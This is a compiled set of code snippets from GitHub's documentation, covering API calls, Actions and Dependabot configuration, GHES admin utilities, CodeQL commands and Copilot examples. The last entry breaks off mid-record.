ID of the project owner and `PROJECT_NAME` with the name of the project. The API key should be provided as a token in the `Authorization` header.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/using-the-api-to-manage-projects.md#_snippet_31\n\nLANGUAGE: shell\nCODE:\n```\ncurl --request POST \\\n  --url https://api.github.com/graphql \\\n  --header 'Authorization: token TOKEN' \\\n  --data '{\"query\":\"mutation {createProjectV2(input: {ownerId: \\\"OWNER_ID\\\" title: \\\"PROJECT_NAME\\\"}) {projectV2 {id}}}\"}'\n```\n\n----------------------------------------\n\nTITLE: Fetching and Processing Copilot Metrics via GitHub API in JavaScript\nDESCRIPTION: This JavaScript code fetches Copilot usage metrics from the GitHub API for a specified organization. It calculates the total and average number of active and engaged users per week over a four-week period. The script iterates through the API response, aggregates user data for each week, and then calculates the average active and engaged users. Finally, the script outputs a userTrends object containing the processed metrics to the console.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/rolling-out-github-copilot-at-scale/analyzing-usage-over-time-with-the-copilot-metrics-api.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\n// Call the API\nasync function orgMetrics() {\n  const resp = await octokit.request(`GET /orgs/${org}/copilot/metrics`, {\n    org: 'ORG',\n    headers: {\n      'X-GitHub-Api-Version': '2022-11-28'\n    }\n  });\n\n  const copilotUsage = resp.data;\n\n  // **Create an object to store data for each week**\n  let userTrends ={\n    week1: {\n      days:0,\n      activeUsers:0,\n      engagedUsers:0,\n    },\n    week2: {\n      days:0,\n      activeUsers:0,\n      engagedUsers:0,\n    },\n    week3: {\n      days:0,\n      activeUsers:0,\n      engagedUsers:0,\n    },\n    week4: {\n      days:0,\n      activeUsers:0,\n      engagedUsers:0,\n    },\n  };\n\n // **Iterate over the data**\n for (let i =0; i<copilotUsage.length; i++) {\n    // **Determine the week number (1-4) based on the index**\n    const week = Math.ceil((i+1)/7);\n    // **Increment userTrends for the current week**\n    userTrends[`week${week}`].days += 1;\n    userTrends[`week${week}`].activeUsers += copilotUsage[i].total_active_users;\n    userTrends[`week${week}`].engagedUsers += copilotUsage[i].total_engaged_users;\n  }\n\n // **Calculate the average number of active and engaged users per day for each week, rounded to two decimal places**\n for (const week in userTrends) {\n  userTrends[week].avgActiveUsers = (userTrends[week].activeUsers / userTrends[week].days).toFixed(2);\n  userTrends[week].avgEngagedUsers = (userTrends[week].engagedUsers / userTrends[week].days).toFixed(2);\n  }\n\n  // Output to the console\n  console.log(userTrends);\n}\n```\n\n----------------------------------------\n\nTITLE: Recursive Subdirectories for Manifests - YAML\nDESCRIPTION: This snippet illustrates how to specify all directories from the current layer and below recursively using globstar in the `dependabot.yml` file to locate manifest files.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/dependabot-version-updates/controlling-dependencies-updated.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\n# Specify all directories from the current layer and below recursively,\n# using globstar, for locations of manifest files\n\nversion: 2\nupdates:\n  - package-ecosystem: \"composer\"\n    directories:\n      - \"**/*\"\n    schedule:\n      interval: \"weekly\"\n```\n\n----------------------------------------\n\nTITLE: Prompt for PAT\nDESCRIPTION: This snippet displays a shell prompt requesting a {% data variables.product.pat_generic %}.  The {% data variables.product.pat_generic %} provided should be the access token generated when preparing the GitHub Enterprise Server source instance.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-ghe-migrator/exporting-migration-data-from-github-enterprise-server.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nEnter {% data variables.product.pat_generic %}:  **************\n```\n\n----------------------------------------\n\nTITLE: qlpack.yml - Defining Pack Version (YAML)\nDESCRIPTION: This YAML snippet shows how to define the `version` property in a `qlpack.yml` file. The version is required for all published packs and defines a semantic version for the CodeQL pack that must adhere to the SemVer v2.0.0 specification.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/publishing-and-using-codeql-packs.md#_snippet_8\n\nLANGUAGE: YAML\nCODE:\n```\nversion: 0.0.0\n```\n\n----------------------------------------\n\nTITLE: Promoting Org Admin with ghe-org-admin-promote (Shell)\nDESCRIPTION: The `ghe-org-admin-promote` utility promotes users to organization owner privileges. It requires specifying a user and/or an organization. Options include `-u` for username, `-o` for organization, `-a` to promote all site admins, and `-y` to bypass confirmation.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_15\n\nLANGUAGE: shell\nCODE:\n```\nghe-org-admin-promote -u USERNAME -o ORGANIZATION\n```\n\nLANGUAGE: shell\nCODE:\n```\nghe-org-admin-promote -u USERNAME\n```\n\nLANGUAGE: shell\nCODE:\n```\nghe-org-admin-promote -o ORGANIZATION\n```\n\nLANGUAGE: shell\nCODE:\n```\nghe-org-admin-promote -a\n```\n\n----------------------------------------\n\nTITLE: Stopping GHES Replication on a Replica Node\nDESCRIPTION: This command temporarily disables replication for all datastores on an existing GHES replica node. It stops all replication services and replication can be resumed with `ghe-repl-start`.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_77\n\nLANGUAGE: shell\nCODE:\n```\nghe-repl-stop\n```\n\n----------------------------------------\n\nTITLE: Evacuating Storage Services (ghe-storage evacuate)\nDESCRIPTION: This command evacuates all storage services on a specified storage server before evacuating a cluster node. It requires the UUID of the storage server to be evacuated. `storage-server-UUID` must be replaced with the actual UUID.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_51\n\nLANGUAGE: shell\nCODE:\n```\nghe-storage evacuate storage-server-UUID\n```\n\n----------------------------------------\n\nTITLE: Previous GitHub Actions billing response example\nDESCRIPTION: This is an example of the JSON response from the previous billing platform for GitHub Actions billing. It shows the structure and properties of the response, including total minutes used, total paid minutes used, included minutes, and a breakdown by operating system.\nSOURCE: https://github.com/github/docs/blob/main/content/billing/using-the-new-billing-platform/automating-usage-reporting.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\"total_minutes_used\": 305, \"total_paid_minutes_used\": 0, \"included_minutes\": 3000, \"minutes_used_breakdown\": { \"UBUNTU\": 205, \"MACOS\": 10, \"WINDOWS\": 90 }  }\n```\n\n----------------------------------------\n\nTITLE: Generating Feature Specification with Copilot Chat\nDESCRIPTION: This snippet shows how to use GitHub Copilot Chat to generate a feature specification for a specific issue.  It describes the process of creating a plan for implementing a new CLI option shortcut based on user feedback. This is useful for planning development and communication prior to implementation.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/functionality-analysis-and-feature-suggestions/analyzing-and-incorporating-user-feedback.md#_snippet_1\n\nLANGUAGE: text\nCODE:\n```\nWrite a feature specification for Issue #426.\n```\n\n----------------------------------------\n\nTITLE: Changing Codespace Machine Type with GitHub CLI\nDESCRIPTION: This command modifies the machine type of a codespace using the GitHub CLI.  Replace `MACHINE-TYPE-NAME` with the desired machine type.  Refer to the GitHub documentation for available machine types.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/using-github-codespaces-with-github-cli.md#_snippet_14\n\nLANGUAGE: shell\nCODE:\n```\ngh codespace edit -m MACHINE-TYPE-NAME\n```\n\n----------------------------------------\n\nTITLE: Rerunning CI with Empty Commit (Shell)\nDESCRIPTION: This code snippet demonstrates how to rerun the CI by pushing an empty commit. It is useful when CI is stuck on \"In progress\" or \"Pending\".\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/setting-up-your-environment-to-work-on-github-docs/troubleshooting-your-environment.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngit commit --allow-empty -m 'empty commit to rerun CI'\ngit push\n```\n\n----------------------------------------\n\nTITLE: Using Job Outputs in a Matrix Job - YAML\nDESCRIPTION: This YAML snippet shows how to define and use job outputs within a matrix job in GitHub Actions. Each job in the matrix generates an output with a unique name based on the matrix value.  It uses the `toJSON` function to display all outputs from job1. Requires the matrix strategy to be defined.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/section-defining-outputs-for-jobs.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  job1:\n    runs-on: ubuntu-latest\n    outputs:\n      output_1: ${{ steps.gen_output.outputs.output_1 }}\n      output_2: ${{ steps.gen_output.outputs.output_2 }}\n      output_3: ${{ steps.gen_output.outputs.output_3 }}\n    strategy:\n      matrix:\n        version: [1, 2, 3]\n    steps:\n      - name: Generate output\n        id: gen_output\n        run: |\n          version=\"${{ matrix.version }}\"\n          echo \"output_${version}=${version}\" >> \"$GITHUB_OUTPUT\"\n  job2:\n    runs-on: ubuntu-latest\n    needs: [job1]\n    steps:\n      # Will show\n      # {\n      #   \"output_1\": \"1\",\n      #   \"output_2\": \"2\",\n      #   \"output_3\": \"3\"\n      # }\n      - run: echo '${{ toJSON(needs.job1.outputs) }}'\n```\n\n----------------------------------------\n\nTITLE: Defining Checkboxes in YAML\nDESCRIPTION: This YAML snippet demonstrates how to define a checkboxes element within a form schema.  It includes the `type`, `id`, and `attributes` keys. The `attributes` section defines the `label` and `description` for the checkboxes set, as well as the `options`, which are defined as an array of labels.\nSOURCE: https://github.com/github/docs/blob/main/content/communities/using-templates-to-encourage-useful-issues-and-pull-requests/syntax-for-githubs-form-schema.md#_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\nbody:\n- type: checkboxes\n  id: operating-systems\n  attributes:\n    label: Which operating systems have you used?\n    description: You may select more than one.\n    options:\n      - label: macOS\n      - label: Windows\n      - label: Linux\n```\n\n----------------------------------------\n\nTITLE: Improving Variable Names in JavaScript\nDESCRIPTION: This JavaScript code logs a message about a person's age. The original code uses abstract parameter names (a, b, c) making it difficult to understand its purpose. Copilot Chat is used to suggest more descriptive variable names (name, age, revealAge) to enhance readability.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/refactoring-code/improving-code-readability-and-maintainability.md#_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nfunction logPersonsAge(a, b, c) {\n  if (c) {\n    console.log(a + \" is \" + b + \" years old.\");\n  } else {\n    console.log(a + \" does not want to reveal their age.\");\n  }\n}\n```\n\nLANGUAGE: javascript\nCODE:\n```\nfunction logPersonAge(name, age, revealAge) {\n  if (revealAge) {\n    console.log(name + \" is \" + age + \" years old.\");\n  } else {\n    console.log(name + \" does not want to reveal their age.\");\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Print Database Baseline - Shell\nDESCRIPTION: This command prints the baseline lines of code seen within a CodeQL database. It requires the path to the database as an argument.  The baseline represents an estimate of non-empty, non-comment lines of code.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/database-print-baseline.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql database print-baseline <options>... -- <database>\n```\n\n----------------------------------------\n\nTITLE: Creating CodeQL Database for Bazel Project\nDESCRIPTION: This snippet shows how to create a CodeQL database for a project built with Bazel. It includes steps to clean the Bazel workspace, set specific Bazel flags to ensure proper build detection by CodeQL, and shut down the Bazel server after the build.  It assumes Bazel and CodeQL CLI are installed and the Bazel workspace is correctly set up.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/preparing-your-code-for-codeql-analysis.md#_snippet_19\n\nLANGUAGE: shell\nCODE:\n```\n# Navigate to the Bazel workspace.\n\n# Before building, remove cached objects\n# and stop all running Bazel server processes.\nbazel clean --expunge\n\n# Build using the following Bazel flags, to help {% data variables.product.prodname_codeql %} detect the build:\n# `--spawn_strategy=local`: build locally, instead of using a distributed build\n# `--nouse_action_cache`: turn off build caching, which might prevent recompilation of source code\n# `--noremote_accept_cached`, `--noremote_upload_local_results`: avoid using a remote cache\n# `--disk_cache=`: avoid using a disk cache. Note that a disk cache is no longer considered a remote cache as of Bazel 6.\ncodeql database create new-database --language=<language> \\\n  --command='bazel build --spawn_strategy=local --nouse_action_cache --noremote_accept_cached --noremote_upload_local_results --disk_cache= //path/to/package:target'\n\n# After building, stop all running Bazel server processes.\n# This ensures future build commands start in a clean Bazel server process\n# without {% data variables.product.prodname_codeql %} attached.\nbazel shutdown\n```\n\n----------------------------------------\n\nTITLE: Searching models by output tokens range on GitHub Marketplace\nDESCRIPTION: This snippet demonstrates how to search for models with an output token limit between 15,000 and 20,000 using the `output-tokens` qualifier and a range.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/searching-on-github/searching-github-models.md#_snippet_15\n\nLANGUAGE: URL\nCODE:\n```\nhttps://github.com/search?q=output-tokens:15000..20000&type=marketplace\n```\n\n----------------------------------------\n\nTITLE: Connecting and Querying PostgreSQL with Node.js\nDESCRIPTION: This code snippet demonstrates how to connect to a PostgreSQL database using the `pg` npm module in Node.js, create a table, insert data, and then query and print the data to the console. It requires the `pg` module to be installed and the `POSTGRES_HOST` and `POSTGRES_PORT` environment variables to be set, or defaults to localhost:5432. The script connects to the PostgreSQL service, adds a table named 'student' to the 'postgres' database, inserts placeholder data, and then retrieves the data, logging it to the console.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/using-containerized-services/creating-postgresql-service-containers.md#_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\nconst { Client } = require('pg');\n\nconst pgclient = new Client({\n    host: process.env.POSTGRES_HOST,\n    port: process.env.POSTGRES_PORT,\n    user: 'postgres',\n    password: 'postgres',\n    database: 'postgres'\n});\n\npgclient.connect();\n\nconst table = 'CREATE TABLE student(id SERIAL PRIMARY KEY, firstName VARCHAR(40) NOT NULL, lastName VARCHAR(40) NOT NULL, age INT, address VARCHAR(80), email VARCHAR(40))'\nconst text = 'INSERT INTO student(firstname, lastname, age, address, email) VALUES($1, $2, $3, $4, $5) RETURNING *'\nconst values = ['Mona the', 'Octocat', 9, '88 Colin P Kelly Jr St, San Francisco, CA 94107, United States', 'octocat@github.com']\n\npgclient.query(table, (err, res) => {\n    if (err) throw err\n});\n\npgclient.query(text, values, (err, res) => {\n    if (err) throw err\n});\n\npgclient.query('SELECT * FROM student', (err, res) => {\n    if (err) throw err\n    console.log(err, res.rows) // Print the data in student table\n    pgclient.end()\n});\n```\n\n----------------------------------------\n\nTITLE: Update Supported Versions for GHES Release - JavaScript\nDESCRIPTION: This code snippet demonstrates how to update the `supported` array in `lib/enterprise-server-releases.js` to include a new GHES version. The new version is prepended to the array, maintaining the order of supported versions.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/lib/release-templates/release-steps-1.md#_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nexport const supported = ['3.10', '3.9', '3.8', '3.7', '3.6']\n```\n\n----------------------------------------\n\nTITLE: Instantiating Octokit without Authentication in JavaScript\nDESCRIPTION: This snippet demonstrates how to create an instance of `Octokit` without authentication for public API access. It initializes an `Octokit` instance without passing the `auth` parameter.{% ifversion ghes %} Set the base URL to `{% data variables.product.rest_url %}`. Replace `[hostname]` with the name of {% data variables.location.product_location %}.{% endif %}\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-javascript.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport { Octokit } from \"octokit\";\n\nconst octokit = new Octokit({ {% ifversion ghes %}\n  baseUrl: \"{% data variables.product.rest_url %}\",\n{% endif %}});\n```\n\n----------------------------------------\n\nTITLE: Validate Price Function in Python\nDESCRIPTION: This Python function, `validate_price`, checks if a given price is within acceptable bounds (greater than 0 and less than or equal to 1000).  It raises a ValueError if the price is outside these limits. This function serves as the basis for generating unit tests using {% data variables.product.prodname_copilot_chat_short %}.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/testing-code/generate-unit-tests.md#_snippet_0\n\nLANGUAGE: python\nCODE:\n```\ndef validate_price(price: float):\n  if price <= 0:\n    raise ValueError(\"Price must be greater than 0\")\n  if price > 1000:\n    raise ValueError(\"Price must be less than or equal to 1000\")\n```\n\n----------------------------------------\n\nTITLE: Clone Repository Helper Method\nDESCRIPTION: This Ruby code defines a helper method `clone_repository` that clones a Git repository, updates its contents, and checks out a specific ref (branch, commit, or tag). It uses the `ruby-git` gem. The method clones the repo into the same directory as `server.rb`.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_32\n\nLANGUAGE: ruby\nCODE:\n```\n    # Clones the repository to the current working directory, updates the\n    # contents using Git pull, and checks out the ref.\n    #\n    # full_repo_name  - The owner and repo. Ex: octocat/hello-world\n    # repository      - The repository name\n    # ref             - The branch, commit SHA, or tag to check out\n    def clone_repository(full_repo_name, repository, ref)\n      @git = Git.clone(\"https://x-access-token:#{@installation_token.to_s}@github.com/#{full_repo_name}.git\", repository)\n      pwd = Dir.getwd()\n      Dir.chdir(repository)\n      @git.pull\n      @git.checkout(ref)\n      Dir.chdir(pwd)\n    end\n```\n\n----------------------------------------\n\nTITLE: Git Bash SSH Agent Initialization\nDESCRIPTION: This shows the output after successfully setting up auto-launching of `ssh-agent` in Git Bash. It displays prompts for the passphrase and confirms that the identity has been added. The initial lines show the agent initialization output.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/connecting-to-github-with-ssh/working-with-ssh-key-passphrases.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n> Initializing new SSH agent...\n> succeeded\n> Enter passphrase for /c/Users/YOU/.ssh/id_rsa:\n> Identity added: /c/Users/YOU/.ssh/id_rsa (/c/Users/YOU/.ssh/id_rsa)\n> Welcome to Git (version 1.6.0.2-preview20080923)\n>\n> Run 'git help git' to display the help index.\n> Run 'git help <command>' to display help for specific commands.\n```\n\n----------------------------------------\n\nTITLE: Jenkins Audit Configuration File (YAML)\nDESCRIPTION: This YAML configuration file is used with the `gh actions-importer audit` command to specify the Jenkins pipelines to audit. Each entry in the `source_files` list represents a pipeline, identified by a unique `repository_slug`.  For multi-branch pipelines, specify the branch and corresponding Jenkinsfile path.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-jenkins-with-github-actions-importer.md#_snippet_10\n\nLANGUAGE: yaml\nCODE:\n```\nsource_files:\n  - repository_slug: pipeline-name\n    path: path/to/Jenkinsfile\n  - repository_slug: multi-branch-pipeline-name\n    branches:\n      - branch: main\n        path: path/to/Jenkinsfile\n      - branch: node\n        path: path/to/Jenkinsfile\n```\n\n----------------------------------------\n\nTITLE: Configuring Models Permission in GitHub Actions Workflow (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to configure the `models` permission in a GitHub Actions workflow to allow access to the GitHub Models inference API. It shows the use of `read` permission under the `models` scope. This ensures the workflow can interact with AI models. Requires the `workflow_dispatch` trigger for manual execution.\nSOURCE: https://github.com/github/docs/blob/main/content/github-models/integrating-ai-models-into-your-development-workflow.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: Use GitHub Models\n\non:\n  workflow_dispatch:\n\npermissions:\n  models: read\n\njobs:\n  call-model:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Call AI model\n        env:\n          GITHUB_TOKEN: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n        run: |\n          curl \"https://models.github.ai/inference/chat/completions\" \\\n             -H \"Content-Type: application/json\" \\\n             -H \"Authorization: Bearer $GITHUB_TOKEN\" \\\n             -d '{\n              \"messages\": [\n                  {\n                     \"role\": \"user\",\n                     \"content\": \"Explain the concept of recursion.\"\n                  }\n               ],\n               \"model\": \"openai/gpt-4o\"\n            }'\n```\n\n----------------------------------------\n\nTITLE: Creating a Support Bundle with Data from the Last 2 Days (Shell)\nDESCRIPTION: Creates a support bundle including data from the last 2 days using the `ghe-support-bundle` utility with the `-p` option. The `-o` option redirects the output to STDOUT, and the output is saved as a tarball. Requires SSH access to the GitHub Enterprise Server appliance as the `admin` user.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_91\n\nLANGUAGE: shell\nCODE:\n```\nssh -p 122 admin@HOSTNAME -- \"ghe-support-bundle -p 2days -o\" > support-bundle.tgz\n```\n\n----------------------------------------\n\nTITLE: Example terminal profile for csh in Linux\nDESCRIPTION: This snippet shows a specific example of adding a terminal profile for the `csh` shell on Linux.  It adds the profile to the `terminal.integrated.profiles.linux` setting, specifying that the `path` to execute `csh` is simply `csh`.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/customizing-your-codespace/changing-the-shell-in-a-codespace.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n   \"terminal.integrated.profiles.linux\": {\n     \"csh\": {\n       \"path\": \"csh\"\n     }\n   }\n\n```\n\n----------------------------------------\n\nTITLE: Deleting an Item from a Project using GraphQL with gh\nDESCRIPTION: This snippet demonstrates deleting an item from a project using the GitHub CLI (`gh`) and GraphQL. It requires replacing `PROJECT_ID` and `ITEM_ID` with the appropriate values. The `gh` CLI handles authentication.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/using-the-api-to-manage-projects.md#_snippet_28\n\nLANGUAGE: shell\nCODE:\n```\ngh api graphql -f query='\\n  mutation {\\n    deleteProjectV2Item(\\n      input: {\\n        projectId: \"PROJECT_ID\"\\n        itemId: \"ITEM_ID\"\\n      }\\n    ) {\\n      deletedItemId\\n    }\\n  }'\n```\n\n----------------------------------------\n\nTITLE: Ignoring Markdown Formatting with Backslashes\nDESCRIPTION: This snippet demonstrates how to escape Markdown formatting by using a backslash before a Markdown character. This allows you to display the literal character instead of applying the formatting rule associated with it.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax.md#_snippet_17\n\nLANGUAGE: text\nCODE:\n```\nLet's rename \\*our-new-project\\* to \\*our-old-project\\*.\n```\n\n----------------------------------------\n\nTITLE: Displaying Extractor Options (JSON Output)\nDESCRIPTION: This code snippet shows the JSON output format when using `codeql resolve extractor --format=betterjson`. It provides information about available extractor options, including their title, description, type, and pattern.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/extractor-options.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"extractor_root\" : \"/home/user/codeql/java\",\n    \"extractor_options\" : {\n        \"option1\" : {\n            \"title\" : \"Java extractor option 1\",\n            \"description\" : \"An example string option for the Java extractor.\",\n            \"type\" : \"string\",\n            \"pattern\" : \"[a-z]+\"\n        },\n        \"group1\" : {\n            \"title\" : \"Java extractor group 1\",\n            \"description\" : \"An example option group for the Java extractor.\",\n            \"type\" : \"object\",\n            \"properties\" : {\n                \"option2\" : {\n                    \"title\" : \"Java extractor option 2\",\n                    \"description\" : \"An example array option for the Java extractor\",\n                    \"type\" : \"array\",\n                    \"pattern\" : \"[1-9][0-9]*\"\n                }\n            }\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Path Qualifier with Recursive Glob\nDESCRIPTION: This snippet demonstrates searching within subdirectories using the `**` glob character in the `path:` qualifier. It searches for JavaScript files deeply nested within the `/src` directory.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/github-code-search/understanding-github-code-search-syntax.md#_snippet_18\n\nLANGUAGE: text\nCODE:\n```\npath:/src/**/*.js\n```\n\n----------------------------------------\n\nTITLE: Verifying an Upgrade Package (Shell)\nDESCRIPTION: Verifies an upgrade package using the `ghe-upgrade` utility with the `--verify` option. Replace `UPGRADE-PACKAGE-FILENAME` with the name of the upgrade package file.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_102\n\nLANGUAGE: shell\nCODE:\n```\nghe-upgrade --verify UPGRADE-PACKAGE-FILENAME\n```\n\n----------------------------------------\n\nTITLE: Configuring Port Forwarding in devcontainer.json (JSON)\nDESCRIPTION: This snippet configures port forwarding with automatic preview opening in the `devcontainer.json` file for a GitHub Codespace. It specifies that when the application running on port 3000 is automatically forwarded, it should open a preview in the Simple Browser. The `label` provides a description for the port.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/codespaces/troubleshooting-simple-browser.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n \"portsAttributes\": {\n  \"3000\": {\n    \"label\": \"Application\",\n    \"onAutoForward\": \"openPreview\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Calling commentIfDataFilesChanged Function\nDESCRIPTION: This line calls the `commentIfDataFilesChanged` function with specific parameters for the repository owner, repository name, and pull request number. This triggers the logic to check for data file changes and post a comment if necessary.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-javascript.md#_snippet_20\n\nLANGUAGE: javascript\nCODE:\n```\nawait commentIfDataFilesChanged({owner: \"github\", repo: \"docs\", pullNumber: 191});\n```\n\n----------------------------------------\n\nTITLE: Checkout a Git Branch\nDESCRIPTION: Illustrates how to checkout a specific branch using `git checkout`. This command switches the working directory to the specified branch, allowing you to work on that branch's code. The example checks out the 'new-main' branch.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/creating-and-managing-repositories/troubleshooting-cloning-errors.md#_snippet_9\n\nLANGUAGE: shell\nCODE:\n```\n$ git checkout new-main\n# Create and checkout a tracking branch\n> Branch new-main set up to track remote branch new-main from origin.\n> Switched to a new branch 'new-main'\n```\n\n----------------------------------------\n\nTITLE: Regex pattern for commit messages with issue resolution\nDESCRIPTION: This regular expression requires commit messages to start with \"Resolves:\" or \"Fixes:\", followed by a hashtag and an issue number (e.g., #1234). This ensures that commit messages link to specific issue resolutions. It must be used with the \"Must match a given regex pattern\" requirement.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/repositories/rulesets-commit-regex.md#_snippet_3\n\nLANGUAGE: regex\nCODE:\n```\n^(Resolves|Fixes): \\#[0-9]+$\n```\n\n----------------------------------------\n\nTITLE: Example JWT payload with customized issuer value\nDESCRIPTION: This JSON snippet shows an example JWT payload after customizing the issuer value for an enterprise. The `iss` field now includes the enterprise slug. The example includes fields like `jti`, `sub`, `aud`, `enterprise`, `enterprise_id`, `iss`, `bf`, `exp`, and `iat`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"jti\": \"6f4762ed-0758-4ccb-808d-ee3af5d723a8\",\n  \"sub\": \"repo:octocat-inc/private-server:ref:refs/heads/main\",\n  \"aud\": \"http://octocat-inc.example/octocat-inc\",\n  \"enterprise\": \"octocat-inc\",\n  \"enterprise_id\": \"123\",\n  \"iss\": \"https://token.actions.githubusercontent.com/octocat-inc\",\n  \"bf\": 1755350653,\n  \"exp\": 1755351553,\n  \"iat\": 1755351253\n}\n```\n\n----------------------------------------\n\nTITLE: Refactoring Inheritance Hierarchy in C#\nDESCRIPTION: This C# code presents a refactored version of the inheritance hierarchy.  Now, each class directly inherits only from the `Employee` class. Additional properties previously inherited are declared independently within each subclass, reducing the depth of the inheritance tree. This promotes better maintainability and extensibility.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/refactoring-code/simplifying-complex-inheritance-hierarchies.md#_snippet_1\n\nLANGUAGE: csharp\nCODE:\n```\npublic class Employee\n{\n    public string Name { get; set; }\n    public int EmployeeID { get; set; }\n}\n\npublic class Manager : Employee\n{\n    public int NumberOfTeams { get; set; }\n}\n\npublic class SeniorManager : Employee\n{\n    public int NumberOfTeams { get; set; }\n    public string Region { get; set; }\n}\n\npublic class Director : Employee\n{\n    public int NumberOfTeams { get; set; }\n    public string Region { get; set; }\n    public int NumberOfDepartments { get; set; }\n}\n\npublic class VicePresident : Employee\n{\n    public int NumberOfTeams { get; set; }\n    public string Region { get; set; }\n    public int NumberOfDepartments { get; set; }\n    public string Division { get; set; }\n}\n\npublic class President : Employee\n{\n    public int NumberOfTeams { get; set; }\n    public string Region { get; set; }\n    public int NumberOfDepartments { get; set; }\n    public string Division { get; set; }\n    public string Company { get; set; }\n}\n```\n\n----------------------------------------\n\nTITLE: Calling Factorial Function with Multiple Inputs in Python\nDESCRIPTION: This snippet demonstrates how to call the `calculate_factorial` function with different input values (5, 7, 9, and 10) and print the results. It assumes that the `calculate_factorial` function is already defined.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/learning-to-code/reusing-other-peoples-code-in-your-projects.md#_snippet_2\n\nLANGUAGE: Python\nCODE:\n```\nprint(calculate_factorial(5))\nprint(calculate_factorial(7))\nprint(calculate_factorial(9))\nprint(calculate_factorial(10))\n```\n\n----------------------------------------\n\nTITLE: Enabling CodeQL Debugging Artifacts with Workflow Flag (YAML)\nDESCRIPTION: This snippet demonstrates how to create {% data variables.product.prodname_codeql %} debugging artifacts by modifying the `init` step in a {% data variables.code-scanning.codeql_workflow %} file and setting the `debug` flag to `true`. This will generate and upload debug artifacts to the workflow run.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/troubleshooting-code-scanning/logs-not-detailed-enough.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n- name: Initialize CodeQL\n  uses: {% data reusables.actions.action-codeql-action-init %}\n  with:\n    debug: true\n```\n\n----------------------------------------\n\nTITLE: GitHub Actions Workflow Step Example in YAML\nDESCRIPTION: Example YAML workflow step to run a Ruby script in GitHub Actions, passing the `GITHUB_TOKEN` as an environment variable. The script can then access the token using `ENV['TOKEN']`.\nSOURCE: 